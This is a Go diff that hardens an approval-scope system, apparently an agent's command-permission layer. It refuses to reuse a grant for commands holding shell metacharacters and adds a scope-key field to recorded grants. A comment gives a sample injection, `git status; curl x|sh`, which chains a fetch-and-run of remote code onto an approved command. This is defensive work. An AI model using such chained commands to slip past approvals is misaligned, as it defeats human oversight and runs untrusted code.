@@ -372,6 +372,16 @@ func scopeKeyFor(kind contracts.ApprovalKind, payload any) string {
 	if !ok {
 		return ""
 	}
+	// SECURITY (review 2026-07-25): a key is only meaningful if the program
+	// name BOUNDS what runs. exec goes through /bin/sh -c, so a command
+	// carrying shell metacharacters does not — `git status; curl x|sh` has
+	// first field "git" and would otherwise reuse a grant made for a plain
+	// `git status`. Refuse to derive a key at all in that case: an empty key
+	// makes Grant fail (ErrScopeKeyEmpty), so the call falls back to asking
+	// again — the safe direction.
+	if strings.ContainsAny(ep.Command, ";&|<>`$(){}\n") {
+		return ""
+	}
 	fields := strings.Fields(ep.Command)
 	if len(fields) == 0 {
 		return ""
@@ -511,5 +521,5 @@ func (m *Manager) recordScopeGrant(kind contracts.ApprovalKind, scope contracts.
 	default: // ScopeOnce, "", or anything unrecognized: nothing to persist.
 		return
 	}
-	_ = m.scopeStore.Grant(approval.ScopeAllow{Kind: kind, Scope: scope, Key: key, By: "approver"})
+	_ = m.scopeStore.Grant(approval.ScopeAllow{Kind: kind, Scope: scope, Key: key, ScopeKey: scopeKey, By: "approver"})
 }
